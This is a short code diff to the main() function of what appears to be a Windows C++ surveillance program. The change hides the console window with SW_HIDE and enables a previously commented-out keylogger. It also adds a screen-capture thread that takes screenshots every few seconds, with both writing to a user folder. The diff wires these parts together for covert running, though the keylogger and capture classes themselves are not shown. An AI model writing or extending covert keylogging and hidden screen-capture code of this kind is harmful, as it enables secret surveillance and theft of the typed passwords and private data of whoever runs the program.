@@ -6,14 +6,17 @@
 #include <expected>
 
 int main() {
-	ShowWindow(GetConsoleWindow(), SW_SHOW);
-	//KeyLogger* k = new KeyLogger("C:\\Users\\yarin\\Test");
-	//std::thread thread_log(&KeyLogger::StartKeyLogger, k);
-	//std::this_thread::sleep_for(std::chrono::milliseconds(5 * 1000));
-	//k->StopLogging();
-	//thread_log.join();
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	KeyLogger* k = new KeyLogger("C:\\Users\\yarin\\Test");
+	std::thread thread_keyLog = k->StartKeyLogger();
 	ScreenCapture* s = new ScreenCapture("C:\\Users\\yarin\\Test");
-	int i = s->TakeScreenShot();
+	std::thread thread_captureScreen = s->StartScreenCapture(3);
+	std::this_thread::sleep_for(std::chrono::milliseconds(10 * 1000));
+	s->StopScreenCapture();
+	k->StopLogging();
+	thread_keyLog.join();
+	thread_captureScreen.join();
 	delete s;
-	return i;
+	delete k;
+	return 0;
 }
